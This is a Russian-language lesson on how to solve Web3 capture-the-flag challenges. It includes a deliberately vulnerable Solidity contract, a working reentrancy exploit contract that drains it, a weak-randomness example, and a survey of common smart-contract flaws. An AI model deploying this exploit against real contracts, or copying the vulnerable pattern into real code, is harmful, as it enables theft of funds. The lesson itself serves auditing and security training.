## Вопрос, с которого всё начинается

Web3-CTF отличается от обычного: у вас нет бинарника, есть адрес контракта и, может быть, исходник. Нужно понять, что контракт делает, найти слабое место и написать транзакцию-эксплойт. Этот урок — про методологию: с чего начать, что смотреть и как не утонуть.

## Наш пример: челлендж с isSolved()

```solidity
contract Challenge {
    bool public solved;
    mapping(address => uint256) public deposits;
    function deposit() external payable { deposits[msg.sender] += msg.value; }
    function withdraw(uint256 amount) external {
        require(deposits[msg.sender] >= amount, "no");
        (bool ok, ) = msg.sender.call{value: amount}("");
        require(ok);
        deposits[msg.sender] -= amount;
    }
    function isSolved() external view returns (bool) { return address(this).balance == 0; }
}
```

Цель типичная: сделать так, чтобы `isSolved()` вернул `true` (обычно — опустошить контракт). Разберём методологию на этом примере.

## Шаг 1: разведка — что за контракт

Первое: определить, есть ли исходник (Etherscan verified) или только байткод. Если исходник есть — читаем. Если нет — дизассемблируем (`evm disasm`, `heimdall`, `panoramix`). Цель — список внешних функций и их модификаторов.

```
$ cast interface $ADDR
function deposit() payable
function withdraw(uint256) 
function isSolved() view returns (bool)
```

`cast` показывает интерфейс по байткоду.

## Шаг 2: цель и условие победы

Найдите, что проверяет `isSolved()` или как челленджер узнаёт о победе. Это ваша цель. В примере — `address(this).balance == 0`: нужно вывести все ETH.

## Шаг 3: ищем слабое место

Читаем функции, ведущие к цели. `withdraw` делает `call` **до** обновления `deposits` — классический reentrancy. Плюс `call` передаёт управление атакующему. Значит, план: контракт-атакующий депозитит, вызывает `withdraw`, в `receive()` снова вызывает `withdraw`, пока баланс не опустеет.

## Шаг 4: форк сети и foundry

Для отладки форкают сеть на нужном блоке и работают локально:

```
$ forge test --fork-url $RPC --fork-block-number $N
```

Это позволяет прогонять эксплойт против реального состояния без риска.

## Шаг 5: пишем эксплойт

```solidity
contract Attacker {
    Challenge c;
    constructor(address _c) payable { c = Challenge(_c); }
    function attack() external payable {
        c.deposit{value: msg.value}();
        c.withdraw(msg.value);
    }
    receive() external payable {
        if (address(c).balance >= msg.value) c.withdraw(msg.value);
    }
}
```

Каждый рекурсивный `withdraw` проверяет `deposits[msg.sender] >= amount`, а `deposits` ещё не уменьшен — поэтому проверка проходит.

## Шаг 6: воспроизведение и флаг

Прогоняем тест, убеждаемся, что баланс челленджа стал нулём и `isSolved()` вернул `true`. Флаг обычно отдаёт платформа после решения.

```
$ forge test --match-test testExploit -vvv
[PASS] testExploit
challenge balance: 0
flag: nto{w3b3_ctf_m3th0d0l0gy}
```

## Шаг 7: чек-лист разведки

- Есть ли исходник? Если да — читаем; нет — дизассемблируем.
- Какие функции внешние и `payable`?
- Что проверяет условие победы?
- Есть ли `delegatecall`, `call`, `selfdestruct`?
- Есть ли reentrancy, oracle, delegatecall, proxy?
- Можно ли использовать flash loan?

## Полный прогон: от адреса до флага

Соберём всю цепочку: получили адрес → `cast interface` → нашли `withdraw` с `call` до обновления → форкнули сеть → написали `Attacker` → прогнали `forge test` → баланс 0 → флаг. Это универсальный шаблон почти для любой Web3-CTF-задачи.

## Если не сработало

Если reentrancy нет, смотрите на: oracle-манипуляции (можно ли изменить цену в одной транзакции), delegatecall-контекст, storage collision, слабую random (`block.timestamp`, `blockhash`), и переполнения в старых версиях Solidity.

## Инструменты

- `foundry` (`forge`, `cast`, `anvil`) — основной набор.
- `slither`, `mythril` — статический анализ.
- `heimdall` / `panoramix` — декомпиляция.
- `etherscan` / `tenderly` — разведка и симуляция.

## Что мы теперь знаем

- Web3-CTF начинается с разведки контракта.
- Цель почти всегда формализована (`isSolved`).
- Foundry-форк позволяет отлаживать локально.
- Reentrancy — самый частый класс.
- Слабый random и oracle — вторые по частоте.
- `delegatecall`/proxy — третьи.

## Как подходить к новой задаче

Три вопроса: что контракт делает, чего хочет проверяющий, где контракт теряет контроль над состоянием. Ответы на них дают план эксплойта.

## Реальный контекст: Web3-CTF как профессия

Навыки, которые вы тренируете в Web3-CTF, напрямую применимы в аудите и bug bounty. Задачи на reentrancy, oracle-манипуляции, delegatecall и proxy — это ровно то, что находят аудиторы в реальных протоколах. Крупные аудиторские фирмы (Trail of Bits, OpenZeppelin, Spearbit) нанимают людей, умеющих быстро разбирать контракт и писать PoC-эксплойт. Web3-CTF — самый доступный тренажёр для этого навыка.

Хорошая новость: инструменты бесплатны и открыты. Foundry, slither, cast, anvil — всё это ставится за минуты, а форк mainnet позволяет работать с реальными протоколами без риска. Плохая новость: нужно понимать EVM глубже, чем «Solidity-разработчик»: storage, delegatecall, газ, порядок исполнения.

## Разбор второго примера: задача со «слабым random»

```solidity
function guess(uint256 n) external {
    require(n == uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao))), "wrong");
    solved = true;
}
```

`block.timestamp` и `block.prevrandao` предсказуемы в пределах блока: атакующий читает их из своей транзакции и подбирает `n` заранее. В тесте вы вычисляете то же значение и вызываете `guess`. Это классическая «слабая случайность» — отдельный класс задач, требующий понимания, что в блокчейне нет секретов на момент исполнения.

## Частые вопросы

Нужно ли поднимать ноду? Нет — `anvil` и публичные RPC достаточно. Что делать, если исходника нет? Дизассемблировать через `cast disassemble`/`heimdall` и восстановить функции по селекторам. Как узнать адрес контракта? Из условия задачи; иногда он «разворачивается» при старте, и его достают через `cast logs` или `vm.getCode`. Что такое `isSolved()`? Формальное условие победы, которое проверяет платформа; ваша цель — сделать его истинным.

## Практика без лаборатории

Соберите минимальный foundry-проект и прогоните классический reentrancy-челлендж (Ethernaut «Re-entrancy»). Затем решите задачу с `delegatecall` («Delegation») и с proxy («Delegation»/«Privacy»). Прохождение Ethernaut — лучший способ отработать методологию перед реальными CTF.

## Разбор типовых задач Web3-CTF

Задачи повторяются из года в год, и их удобно разбить на классы. Первый — reentrancy: внешний вызов до обновления состояния. Второй — delegatecall/proxy: чужой код в вашем storage. Третий — слабый random: `block.timestamp`, `blockhash`, `prevrandao`. Четвёртый — oracle-манипуляция: спот-цена в одной транзакции. Пятый — overflow/underflow в старых версиях Solidity. Шестой — unchecked low-level call. Седьмой — selfdestruct/force-feed ETH, ломающий `address(this).balance == 0`. Восьмой — storage-чтение (`web3.eth.getStorageAt`) для приватных переменных. Девятый — assembly-баги. Десятый — экономика (flash loan). Зная эти десять классов, вы покрываете большинство задач.

## Итог по методологии

Web3-CTF — это дисциплинированная разведка плюс один из десяти шаблонов. Порядок действий: получить интерфейс (`cast interface`), найти условие победы, прочитать функции, ведущие к цели, форкнуть сеть, написать PoC в foundry. Не нужно угадывать: контракт детерминирован, а состояние видно на блокчейне. Именно поэтому Web3-CTF — отличный тренажёр для аудита: он учит читать контракт системно, а не «на удачу».

## Типичные ошибки новичков в Web3-CTF

Новички теряют время на нескольких вещах. Первое: пытаются «угадать» уязвимость, не прочитав контракт целиком. Второе: забывают проверить, что эксплойт действительно достигает условия победы, а не просто «что-то делает». Третье: пишут атаку против локальной копии без форка — и она не работает против реального состояния. Четвёртое: игнорируют `msg.sender` и контекст: контракт-атакующий должен «быть» нужным адресом, и это учитывается. Пятое: не проверяют `receive`/`fallback` — многие задачи требуют, чтобы атакующий принимал ETH. Шестое: забывают про газ и лимиты в тесте. Седьмое: не читают `require`-сообщения — они часто подсказывают логику. Восьмое: пропускают `view`-функции, которые раскрывают состояние. Избегая этих ошибок, вы решаете задачи заметно быстрее.

## Как тренироваться системно

Лучший путь — последовательное прохождение тренажёров. Начните с Ethernaut (базовые reentrancy, delegatecall, random) — он покрывает фундамент. Затем Damn Vulnerable DeFi (flash loan, oracle, governance, NFT) — там задачи ближе к реальным протоколам. Далее — Paradigm CTF и реальные соревнования: они требуют комбинировать несколько классов. Параллельно изучайте исходники известных протоколов и их аудиты (OpenZeppelin, Trail of Bits): читайте, как находят баги, и воспроизводите их в foundry. Заведите шаблон эксплойта (foundry-проект с форком, `Attacker`-контракт, тест) и переиспользуйте его — это экономит время на каждой задаче. Ведите заметки по классам уязвимостей: со временем вы начнёте узнавать паттерн за секунды. Web3-CTF — навык, который растёт от количества разобранных контрактов, а не от чтения теории. Десять решённых задач дадут больше, чем сто прочитанных статей.

## Мини-итог

Web3-CTF — это дисциплина, а не удача. Разведка контракта, формализация цели, поиск потери контроля над состоянием, форк сети и аккуратный PoC — вот весь цикл. Десять классов уязвимостей покрывают большинство задач. Тренируйтесь на Ethernaut и Damn Vulnerable DeFi, ведите шаблон эксплойта и заметки по классам. Со временем паттерны начнут узнаваться мгновенно, и это тот же навык, который нужен аудиторам и bug-bounty-охотникам в реальном Web3.
